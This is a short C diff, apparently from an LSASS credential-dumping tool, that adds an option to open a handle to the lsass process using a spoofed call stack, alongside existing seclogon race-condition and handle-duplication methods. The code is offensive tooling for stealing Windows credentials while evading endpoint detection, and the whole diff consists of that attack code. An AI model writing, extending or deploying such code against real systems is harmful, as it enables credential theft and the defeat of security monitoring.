@@ -3,6 +3,7 @@
 #include "dinvoke.h"
 #include "modules.h"
 #include "malseclogon.h"
+#include "spoof_callstack.h"
 
 #if defined(NANO) && !defined(SSP)
 
@@ -49,6 +50,7 @@ HANDLE obtain_lsass_handle(
     IN DWORD permissions,
     IN BOOL dup,
     IN BOOL seclogon_race,
+    IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
     IN LPCSTR dump_path)
 {
@@ -73,6 +75,13 @@ HANDLE obtain_lsass_handle(
     else if (seclogon_race)
     {
         hProcess = malseclogon_race_condition(lsass_pid);
+    }
+    else if (spoof_callstack)
+    {
+        hProcess = open_handle_with_spoofed_callstack(
+            spoof_callstack,
+            lsass_pid,
+            permissions);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
